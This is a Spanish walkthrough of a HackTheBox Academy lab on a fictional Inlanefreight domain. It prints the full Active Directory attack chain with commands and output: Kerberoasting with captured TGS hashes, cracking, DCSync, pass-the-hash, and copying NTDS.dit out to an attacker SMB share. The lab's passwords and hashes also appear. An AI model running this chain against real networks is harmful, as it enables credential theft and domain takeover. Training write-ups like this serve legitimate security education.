
# Caso práctico: Informes

Somos un pentester de Acme Security, Ltd. Su equipo ha sido contratado para realizar una prueba de penetración interna en una de las redes internas de Inlanefreight. El evaluador asignado al proyecto tuvo que ausentarse inesperadamente, por lo que su gerente le ha encomendado la tarea de hacerse cargo de la evaluación. Ha tenido poca comunicación con el evaluador, y todas sus notas se guardan en la máquina virtual de pruebas configurada dentro de la red interna. El alcance proporcionado por el cliente es el siguiente:

* Alcance de la red:`172.16.5.0/24`
* Dominio:`INLANEFREIGHT.LOCAL`

Tu compañero de equipo ya ha creado una estructura de directorio y un cuaderno de Obsidian detallado para registrar sus actividades de prueba. Hicieron una lista, `13 findings`pero solo registraron evidencia de algunas. Conviértete en el evaluador de penetración y completa este simulacro de prueba lo mejor que puedas.

```bash
Objetivo(s): 10.129.177.16 (ACADEMY-DOCRPT-PAR01) 

RDP con el usuario "htb-student" y la contraseña "HTB_@cademy_stdnt!"
```

## <mark style="color:purple;">Pregunta 1</mark>

> Conéctate a la máquina virtual de prueba mediante Xfreerdp y practique las pruebas, la documentación y la generación de informes con el laboratorio objetivo. Una vez que el objetivo se genere, acceda a la instancia de WriteHat en el puerto 443 y autentíquese con las credenciales de administrador proporcionadas. Experimente con la herramienta y practique añadiendo hallazgos a la base de datos para familiarizarse con las herramientas de informes disponibles. Recuerde que todos los datos se perderán al reiniciar el objetivo, así que guarde los hallazgos de práctica localmente. A continuación, complete la prueba de penetración en curso. Una vez que obtenga acceso de administrador de dominio, envíe el contenido del archivo flag.txt al Escritorio del administrador en el host DC01.

Una vez que accedemos nos encontramos un cuadernos de Obsidian con una estructura super completa de pentesting:

<figure><img src="/files/TWwnLBhbGnZalZleelfL" alt=""><figcaption></figcaption></figure>

En el apartado `Evidence > FIndings > H5` nos encontramos las credenciales del usuario `administrator`, que usaremos para conseguir una shell SYSTEM en el sistema objetivo:

```bash
┌─[✗]─[htb-student@par01]─[~]
└──╼ $impacket-psexec 'administrator:Welcome123!@172.16.5.130'

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.130.....
[*] Found writable share ADMIN$
[*] Uploading file wzacTqyu.exe
[*] Opening SVCManager on 172.16.5.130.....
[*] Creating service JqFR on 172.16.5.130.....
[*] Starting service JqFR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2237]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Este host no es el DC por lo que necesitaremos buscar más información. En el apartado `Notes > Credentials` encontramos la contraseña del usuario `asmith`, con el que podremos realizar el resto de ataques. Esta sección deberíamos ir anotando todas las credenciales que consigamos:

```bash
| Username | Password | Scope  | Notes             |
| -------- | -------- | ------ | ----------------- |
| Asmith   | Welcome1 | Domain | Password spraying |
```

### Kerberoasting

En el apartado `Evidence > FIndings > H1` vemos que este usuario asmith puede realizar un ataque Kerberoasting, ya que ha recopilado cuentas válidas con `GetUserSPNs.py`:

````bash
```$ sudo GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/asmith
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ---------------------------------------------------------  --------------------------  ---------  ----------
sts/inlanefreight.local                        solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:11:38.041017  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL         2022-06-01 23:11:50.431638  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:12:06.009772  <never>               
vmware/inlanefreight.local                     svc_vmwaresso                                                                 2022-06-01 23:13:09.494156  <never>               
SAPService/srv01.inlanefreight.local           SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:13:25.041019  <never> 
````

Vamos a explotar esto para finalizar el ataque Kerberoasting:

```
┌─[htb-student@par01]─[~]
└──╼ $ GetUserSPNs.py -request -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/asmith

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ---------------------------------------------------------  --------------------------  ---------  ----------
sts/inlanefreight.local                        solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:11:38.041017  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL         2022-06-01 23:11:50.431638  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:12:06.009772  <never>               
vmware/inlanefreight.local                     svc_vmwaresso                                                                 2022-06-01 23:13:09.494156  <never>               
SAPService/srv01.inlanefreight.local           SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:13:25.041019  <never>               



$krb5tgs$23$*solarwindsmonitor$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/solarwindsmonitor*$91daa5c937a55ba6c8e19c0b044dae36$35cc0a06de6f75d415eadb5206be2e66e6d84ad8ed595fb65fce64ea36f68b53ef28304910eda714e1dfe018daf2ce8d72e68ca2710f655b3b837298557277864176807b2bffe79ada13be96b5e7d9de5941b493b1922735edf3e6b546271284277fd6335e641db70ab8b1f4a8be4e1c912dd2775640c985b18c255f167ac3c01be746a8c5fe4d3cc6ad458ebb083b80db3289e8c76b26798b146125c3eb408477622a6de89c4bf2b3a81c1e56a9ecb1e11c04550e693dbf28a401f913c10ee1ab8dedaf7e45eb5751f5f1dfb5a5dbe061b12225635802aa477f326c44dd2905205f230348ff7cea0fa9bf68f6daa9e1eb43fe80797e3f4776addd08c0d75bf219d94f81ee700a3402680573557201c56851fbfa064efd9b4230660bc2e3395634a7bdb5772c80f5862d0a5e77e084abb9100fb59a37a1078fc57145f90b904cc0392af4a661ab899f02af028be321550bdc410985f0eff1dd507fec0ce3ba759c137261950d654a4859e783094854d43a9955d357dc364cc699b9a316dabd9aff14e2ceae37813f4d9cd1a3e5b78916ab6dd392470d2a85c66892d8b6eecd2e6741658a446eae7d735cef47730debce7d7ae06c8339727d0924c36912f298cd746b230f6966f161ddb0ee051fb43dd82e7718ad7618db8f33388f20d1819541a3413f3a14014ed2ef41dc23ad07312c7c4c2e1911f9023c5bfd0c7e896c8274f108c12d8ff775c6f0d1e3ac106924946c663da9927f113def454773f1991074033017e0a45acc664321c570c8bffc1ca798f270d494d2869db1691720694d61cf9026824abbf0771d8457f3b7dcfa3b2e2af5efe7cfaead1c96ac39b088e5d4b14b22745fe8692f2d71da401539e590eb860904c690c208d7dfc5790d6f80b86ba7bc3c97467e499c0c0f576813ede91a45ecd1e08c88b7e9115dfd7b5205fde1d0b6240e1e3c93217efa222fcfb9f0b377b4d0d708c056f762d742f54dc6ff37783d249dace7b8aaa41e9aaf8d0c49de09bc24464c9a17d15322611f0e1d363a649247f47ebf167d340d0295efe353143014d0e6f4957b84068bddaff24143043166b539a712ce099ebc72601d7bdcbfa733d2af6b0b692ecba93f995436645dea99e9329a21ce8b82a9e3c576e4d0fee82d8f875a289904b150cc41e7068c600b71d4b285ddc9a9d580aad9b1037079d203daf25a27966a9ea84e353f8fe36f8dbb98c5dda2fe6590360ec9e042e87a9fca3912c66f994a94b17f8e4f443869ae89badfdd9dabcc3bb14f8b70adeb96c8294ddd1864ac34e62cc112e31de150607de5e8ea5c0b902c4209649224e96c08
$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqlprod*$2e9504e16783663045db9e5fe5e8d7c8$92570a001b6ceb1af7e02070de0652fac678b62b19c2b7c78c4546fe43b6a20e969694d656ad3594bfc9bf3246d7b96f75b6daee12d6a9d12c44bf3a7cc1b05dda6367a263106e87411f95bc5217b00ecfb5b11d545989d82c57da54a889d9b5cac1da0323879d4b7461aa29093caa200b626a824e4e7c20835ae065a7484d86d5a347ad23634a305522617340eed01c8a6f4ee16d5bd293c96846c17a7d570c2f936370f55e619c016e717f3db994d34afe67b779446e3cc289a6340e79e10b72b48e0a537458a41ecbb64e28547e579ae5bb183dc34ff3e6e9351e9e311d9e225eaa4e6834e250c29b08147f3e54aba82286feb89146b15a82c2a61c591b003fbd795a24731220fd3bbbaee51cfea417a7c2ef9b1779a962ecf90fa65544facea346cfc424cdf19b87d330e055f6d2c9dd23913e0f49b1ec533488d4d696bbd5f7e652411aa0e0de9c905b6b367ca7b2cfe391d821872788a6e8ac962eee6fe4afc83e8d0a7704f98ccc68126eda81e0109d206c7ade9c7e24ff8a82eef28801f63eb1c0f9da434b978f795adce6d6a2d1d0aadae026ff6e3df02bd4e17053b677871fb84993ad775c8eb96c1e033ab88a0bef3595cba7983d5c8c0a2f581b13bedc323f3d81ab6aa2420ad1e83116e8f02a4211c2f8b6c2582bca494fc7e1a68bc3c4d4f73649a2ad6251f7292f5f5b252fc9b9a3242e6d96f72e91b4befb4a1353b4226055ff90856c5783e011d863273224fcec7418488fd6e17f6b5c43cbf677007a182d26fc78e43fa9298344b4e5f48bc77a7f91617b5d41f993ab71a0311daf924d98624de70ae91437f0527012a75da003af29e383694d4c0567639b200e1f3bc16ad7e610b912827efbccc8a3902b96f94b7135d862c74aed23925a9302ad3906a3c7094485662dd7a688d18c63eaf8bbd06f2542a4bb02e40a71378e4a967587a83fb273ca19f91a2c4f16493ca8c4f34d035c1bbf62f47ee76dd6ab7bc640c49a2f55873771ec558bec255402c6251c7e90234a89284fa3cd515e6807984fb104c984087d7b0600632a10a2a1a9591d69f93fd6af87b5ef106d033deaed54ea64377630dbda2e925c5827ee5d9078a81eebf5ef78b4b590ef02bea6ac70fd3e388591864fdf6ac33a0c272f2e5caa85ccbefd26d860f8bbff7065ba3eb4b43f9217dc0d6b06228b9b67d131020ac6155e3b175ee06428b2d43c7a7a2daa6f6bca2df7ee8f471d6207efad9e3aee75fc2a3b701d8bf43cfe925466e88d755fac1a427e2b0ff4b5070fa4f556671ad8be84b45df53f9e83c385c10d8f77c320cf1140fa54c8a530ff393d103b
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$7a63005a72d48594bd06bbb819f0bd7c$a09b6ca83ed62c21855792848d21f3a5175630b92dd4aaf70778a80c2cd75d0a631b370df4dddf116430d6aa6aaf192f4ab72fd2f81e14737e29db9dedb6b6565ee1c68786791ec3cb18e262e47d79d14024aed6b07cf6eae4774c8bf9089f93c1930c3ba2d1e0c1bbebd860ed27795421ceee6aef3b07d05cf3541188862e4c164a2acf114b84c187c1ebe16fd85463f9701d95a31cefad75117d90f5d8eb7c42d966731649f99c1b43b5ad14d587858d9332df80b1d32c88eed0a6f6a8052f2e2319e31cf3ec2d6eda21c1cd6d35d9d5bf53060a3a7a81e44d79814415f0294747af65c6274629690b4b2c7c30174f94191769f4f11e84a228b55e2907831429fcbaa281e767cba75ad39796dbf6c53ca5ecafb037531a90e2ea374048c76824bf4265f8105db22ee15143556f71fc97e3aba4229390f5c2879149d63e087b575cc7255b772af0c478f2d102110a1f98248350a18f23803113a04cc9f2ae61a71547ab4317dc0d7abe10978ebb4a602484b19dac42a9830ef038874b9cd984569a90fa64a63161503d1a278621384f5d902ad0a06f2cb7c552387831d99a83b8b80bda40a5f056851a127e5610fc8f07b44a7d5efca1c8d2e06e6afc346077d0412d21bf5d01d6d180ae5d4238085bd00d29b84bb1595c885dd87b30f4eda8d07316df36b19e31b03723912f7ad31dc46d68dcd917a15d20e01ff2078b3d3e9ed28ed0e20cad3cd3be535a29f14ab7d40fa22e382e83f562a3e16849400603e65b67ee16cfd3ff3e2f1ad9fc87bbcabce1b327ef760a035cca8c10b97d87445c44f1bd1178c55e1b70a349aad116945338031c9c2686fe7c72f3ede87f9700e7934d64f35697beea5d08c01c6d6c6783d6198809e522028ef8d541d434fbe90e9648c612fd6dd31c38a75f09316bdec796414b8bba474e90202a9a783f4e8a397eda0d8df57af99af6f12fe8823a3c7bff9469e5addb02cde7baa28fa0e79e59b0d835e586c70afef274f4728386e721e4188037215f51274c6d7ee84dc5a3253cc7ccd68f7b5a94b607710afaea228d4e6c97ca02c8909ab0bcf6f9796f42dd5c5330d5ebdd9a06c122ecde0d9e9482819e9c16383ee1c8d17d64e5fa2143fdf00b8428765cbb0b10037d3b6193dec9dcbdcd666c672a8758130ccffb49da8c215df330c8061d3fb81b5ab53b238eb033f54ad393810fdaccb9dee2238b1a34d460c54fe3d5c30d2723c7c4ef8fa635842bc038e2f248f97efa732539b8eb1134da0ccf4964d087a6db7f5bbd4da76a1a83dd39712122bc09ec6e07cc02e7924204f20e12fbbd9165730d59877e17afc6
$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/svc_vmwaresso*$c8de076f05afbd1d4b5df8778bdc2640$0ec4d6964e2c3490bc2a2d1993de820b61dd2f31fc857526acd873b5971bf27d020dca6989ba34bc829c0a785c2efac2aeabf8c37f0638b3a7e05cd4231c8e9fcb44265e8b5948773c8b1a20d4c12d190e5bc64f83281831b1a1af6f03a178a4247d6abc7ac1fd0935d26072c128acc7793ba87e40b5263536f9288919fd2f09b694a0fb1810f16a98d0258e1280b37f37968b70b5a869353b81c5cbcf7b98fac7f0f57ed04f82004a54fdeadffb574d5273dcbb8d05bf043fc7cfa4489639c831462c1540dc236d7442d9a9620875d37d2094bbf49f9e3ea4de2f3ab1d016c3f4c7046a5d98d66d31584584f871c89205937e44e1c45680880c4daf40c46ac3ba3bec54ae1d728ef2d7c3e384c043cd114d48389ba88f45b7f8c8904ff9195ba40dd5b64aef959d584fc60f798669f5beacc64941b57c37fe5e38dfc067f1e12e38a2e9d3f2c2bc3872a8f14ae80de60a3d7a6237847d0be91b6ccb7de3bdf1005d8e29df394cc38af7efe7d7b002cbd3e9970840a822363e271561df6b682971a04a5e6b8410f70866c7a59af7a57c6428d2e4de533397609f183a5efda636c5b000887459c9ec36d587cf65c0c76744edcde98d155ddb794c16a34d8ca493d0d8ab0c9fb7a071d3e642765027b3cbec50d377785119d7a9183264426ce35654b4e6daf927935f6531303b97ee4d385816fb847a7f76e937afffdb401931fef3fdb097361ef647c17a520daebf3c652d7a9c187b6ea4077cc142bef70464456d8a5148956e68b4028df5dc52c63f131f60b2f0684cf6a83fec97a38b4a8238b80171429605ca73b59500a002eff9a4fbf1582fd196aab9768b21b978aec4973f5e1fbcb2cb099ffefb9bab1658fac2215cdaf2d63eb5a23c3e1f4b316bc1dbd566f11c58a1f5db9db1efe0473650ad0fcd0bf5dc2e1f4f6b3c390ec69c1fc38b7d5fd6f3ad406f55f6ad572ded846dd7c850e87477e8ab284cac549b38277cfbe2e56acf2d3a78ca8eb56ae44a3ab93c945bab251bb51884bf6f2d36d145b2699a49699bdc4b65c02478606e003965e26783af7d786e58b9fe80c0879453eccab54c567db5fb15afd037978d6d91548fab71e7536d4990de0e87259e6be23532e193ee91a3fd104e3e65208888f605f607292569d221a084e0d89d920559bd3c9c12e79693b1effe09017881130a334ad4079ce21848ec654c13f38cb0d49387f99985aac8f4dba9b9837f3129fce19e8d18558db1b74982c13388bcc6f1208c5485c96c6afd5b02a36c3536ea89fe69bb9a069dc08d7bb815d0d998e128733b46f09df3ba33b122fff84d5f9b8798cc9a
$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$6a439213328cefb61ef1d85d0ed75745$b901b72413fb7ac247acd7c7e2060cc2c8506e02c501f0db95636de489dbcb7c75be7a74f2b62c2104bf940fe9eb0fe92c8a6c0093b13fc351e7efaf17a4e07c692733d1d03bca6bcfa8ff4198175b8ffe0b8d9562352219a3bacecb4450f9d9797e0c8da5395fd0c539da084ea7da62a4de4b406b1eee11f68ab013b74c73546edb2fd7e202e688800a9824044c1e376ec5f69bdde163603855661b52813838134804f9f6c8a7daa145b0122eca70d2de13c7149e5b8347e823d45ea759217ddf4636ba951d2aedebce47bce77ed64f0169daaca5e1b07d866cd6a316a52f4533380549c36494555f3401ba342ddf31905df79efdea6bd045dc7b196d4b21c22b1937254eb0a3342549c34a1678fa51467f4aeb2b4bf7ef41ce0eb613b3a20d928beafa09560244b6e52224387fd0af6af6c3a5a3ed11c975e130826c716691b74224484f6c9e3154230310b96128f4071e88d901deaee1100f717d02536f3a7069ede83d197518f963f65f60bf948ffda4c6ba6ba0c8f49ec13d7092849fdfcd944bc470446bb7e10a4dd409ce993694de4411564ab21547c0f21a7d5d303bc83615231752f9a1c6f8ca6475893150e2973326c9bfaefc150299cfe9d8ad547a91abf1938bd78858c618d6121521b3fb16fe73db33ffebaafcce867f4679e9bbf505297c67c801c1c393e7ada1358596024e2e6b61a88e7fd79a112494e01a213365add15ec9610d1bb15fb9ad504fece3f88ad629358357975fdcb9f72bd76b98a498484548b7bb44ebbb23e1bf5a85e37d82c685d5bbfeea4800a612d93e8da706954d8f4f50cddc725821a50362d5d491619884073a7273db29a9a13b5ad78cb3f0d107d17dff90edbe09cd63fd6d61d48956afa97922d4e8bfb0c4b2e0ae5d0acfb98f5cecc8290773437133d99ee9ea37665a83d3ee8c8685fa5a2014c0be070691aab4e644a291abe2453db811b9167235a287b3f4d775d2f6f065c03cafc3604f66bb0978e7717bf1927733f0766ebd13ceea2dc0f41e23a4394198126415b6acd765d4a6a252b4e9109041b82c95a657c26d19c32d64a1e016dba626182a3c0f53af01eec86422600eff15cb0856bcd8607546e1aeab79a6f82f03f50c4c23bdabb438cf5d40374bd3c726ec065af045a3db9174649f433f2a7298b5c2417485a920b6a4be2d4d5e0a3aaf5ea51999dec170a86c93ead0b50d81da72cf00da80c7a1bdd3389345023652b36fc4ed3692838d998580ae95e122bf6e73a34dee03489a3a09df39d94b3baf22659b0610f60dc71f61725da50c4c0d5a454b91070fa436dd8a1f9123aa7109654887
```

### Cracking de Hashes

Tenemos los hashes krb5tgs de varias cuentas! Vamos a guardarlos en un archivo `hashes.txt` y a crackearlos para obtener las contraseñas en plano en caso de que sean débiles.

```shell-session
$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 

Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Virtual_09       (svc_vmwaresso)     
Solar1010        (solarwindsmonitor)     
Sap82696         (SAPService)     
3g 0:00:00:12 DONE (2025-04-02 21:46) 0.2491g/s 1191Kp/s 5017Kc/s 5017KC/s
```

Obtenemos 3 contraseñas en plano. Estas contraseñas deberíamos añadirlas en el apartado `Notes > Credentials`

### DCSync

Utilizando las credenciales de `solarwindsmonitor` conseguimos realizar un volcado de todos los hashes del sistema, con lo que estaría el dominio totalmente comprometido:

```shell-session
$ secretsdump.py INLANEFREIGHT.LOCAL/solarwindsmonitor:Solar1010@172.16.5.5

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0eed386fa4e62210e41961f91dcf14d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
INLANEFREIGHT\DC01$:aes256-cts-hmac-sha1-96:59adbfc4757ea1e3eaa12eabbd12046090a973fd9299f9f8cfc4e6b79d88c5c1
INLANEFREIGHT\DC01$:aes128-cts-hmac-sha1-96:7643dd01136ab821f3ad7ccb18654134
INLANEFREIGHT\DC01$:des-cbc-md5:928a109dec13e6b9
INLANEFREIGHT\DC01$:plain_password_hex:0aadab9bc7c8149a77e67a4034a1339575f5e336bbb72aea4ecba23dca8aee01947ff6995f85ae75cc66fe050200f5e0815d3f657af766d8d3a8d5df36d0ad06f9af7e1626d4637f8c2cb971bf19be432e8539e43c168b207440fb1c0e3b69e21eb6b49cb48be8f4a64524d9389478754101c7569a447bfec14a6a65a9f8e6335d4cc39801008382ad1b90a2e1240d8c954c16797eb767c011a430a78b03f887ad0ca745bc0de7b8b711886908489fcaacf287a5f2591adb5d5230e071bb676ba1850a5d38238f6d715d068b12be6aa5de5f7b2eeed0af1eb1e89879998b7bcfad196503e97de801f47b9308e83e8b41
INLANEFREIGHT\DC01$:aad3b435b51404eeaad3b435b51404ee:583299d59647fd861971a2e9fbae5123:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x519c86b4cbdc978b359bc039173416623198c107
dpapi_userkey:0xce7d9f94fce72cd9598ac60710787c0d9a56ce0b
[*] NL$KM 
 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
```

### Pass the Hash

Tenemos el hash del administrador, con lo que podríamos realizar un Pass the Hash para conseguir una Shell SYSTEM como Administrator:

```shell-session
$ psexec.py inlanefreight.local/Administrator@172.16.5.5 -hashes :88ad09182de639ccc6579eb0849751cf
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[*] Found writable share ADMIN$
[*] Uploading file zlutpFJi.exe
[*] Opening SVCManager on 172.16.5.5.....
[*] Creating service tfoT on 172.16.5.5.....
[*] Starting service tfoT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### Acceso a la flag

```powershell
C:\Windows\system32> cd c:/Users/Administrator/Desktop

c:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of c:\Users\Administrator\Desktop

06/08/2022  02:49 PM    <DIR>          .
06/08/2022  02:49 PM    <DIR>          ..
06/08/2022  02:49 PM                22 flag.txt
               1 File(s)             22 bytes
               2 Dir(s)  18,093,752,320 bytes free

c:\Users\Administrator\Desktop> type flag.txt	
d0c_pwN_r3p0rt_**********
```

***

## <mark style="color:purple;">Pregunta 2</mark>

> Después de obtener el estatus de administrador del dominio, envíe el hash NTLM de la cuenta KRBTGT.

En la salida del ataque DCSync vemos el hash del usuario KRBTGT:

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
```

Al igual que el resto de hashes encontrados (o por lo menos los de los usuarios importantes) deberíamos añadirlos al apartado `Notes > Hashes`

***

## <mark style="color:purple;">Pregunta 3</mark>

> Descarga el archivo NTDS y realice el descifrado de contraseñas sin conexión. Envíe la contraseña del usuario `svc_reporting` como respuesta.

#### Pass the Hash con Evil-WinRM

```shell-session
$ evil-winrm -i 172.16.5.5 -u Administrator -H 88ad09182de639ccc6579eb0849751cf

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\> whoami
inlanefreight\administrator
```

#### Crear Shadow Copy de C:

```powershell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {7da7bb5f-5387-48b3-9528-03607b8fa090}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

```powershell
*Evil-WinRM* PS C:\> cd C:\NTDS
*Evil-WinRM* PS C:\NTDS> ls

    Directory: C:\NTDS

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/2/2025   3:34 PM       88080384 NTDS.dit
```

#### Copiar NTDS.dit desde VSS

```powershell
*Evil-WinRM* PS C:\> mkdir C:\NTDS

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         4/2/2025   3:53 PM                NTDS
```

```powershell
*Evil-WinRM* PS C:\> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
        1 file(s) copied.
```

Para extraer los hashes del NTDS.dit necesitamos el archivo `SYSTEM`, por lo que lo copiaremos a `C:/` y nos lo enviaremos igualmente:

```bash
*Evil-WinRM* PS C:\> reg.exe save hklm\system C:\system.save
The operation completed successfully.
```

#### Envio a la máquina atacante

```bash
┌─[✗]─[htb-student@par01]─[~/Downloads]
└──╼ $ sudo impacket-smbserver -smb2support CompData $(pwd)
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

```powershell
*Evil-WinRM* PS C:\NTDS> move c:\NTDS\NTDS.dit \\172.16.5.225\CompData
*Evil-WinRM* PS C:\> move C:\system.save \\172.16.5.225\CompData
```

En la máquina atacante recibimos el NTDS.dit

```bash
┌─[htb-student@par01]─[~/Downloads]
└──╼ $ ls
NTDS.dit  system.save
```

#### Extracción de hashes

```shell-session
$ impacket-secretsdump -ntds NTDS.dit -system system.save hive -outputfile hashes.txt

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from NTDS.dit 
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f0b00d749e8593b89f1f932c734b3915:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93a
asmith:aes256-cts-hmac-sha1-96:1d57bc8721cdba81246312bf22a8b6b8b8191ed62e8be97b7535e0ba03d76904
asmith:aes128-cts-hmac-sha1-96:3e56288401447df9f6cd45d606d7d59f
asmith:des-cbc-md5:76e32f207c498f4c
<----SNIP---->
svc_reporting:aes256-cts-hmac-sha1-96:a5ccd3a16117118ad23fd672b9afd7cc656c71b239f8e1edbda01c113e7064e0
svc_reporting:aes128-cts-hmac-sha1-96:42e8bdc95e0f0dc8ba6ef608da287cf2
svc_reporting:des-cbc-md5:0e51795ed62fe01c
svc_reporting:dec-cbc-crc:0e51795ed62fe01c
```

Ahora podemos filtrar el archivo que nos ha generado para buscar solamente los del usuario `svc_reporting`:

```bash
┌─[htb-student@par01]─[~/Downloads]
└──╼ $ ls
hashes.txt.ntds            hashes.txt.ntds.kerberos  system.save
hashes.txt.ntds.cleartext  NTDS.dit

┌─[htb-student@par01]─[~/Downloads]
└──╼ $ cat hashes* | grep svc_reporting
svc_reporting:7608:aad3b435b51404eeaad3b435b51404ee:a6d3701ae426329951cf5214b7531140:::
